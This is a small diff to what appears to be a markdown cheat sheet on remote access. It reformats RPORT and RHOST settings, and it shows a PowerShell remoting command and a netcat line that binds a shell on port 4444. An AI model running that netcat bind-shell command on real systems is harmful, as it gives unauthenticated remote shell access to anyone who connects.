@@ -33,8 +33,8 @@ Enter-PSSession -ComputerName "hostname"-Credential "easyduck"
 
 ## Server Settings
 
-RPORT = `4444`
-RHOST = `xxx.xxx.xxx.xxx`
+- RPORT = `4444`
+- RHOST = `xxx.xxx.xxx.xxx`
 
 ```bash
 nc -lvp 4444 -e /bin/sh
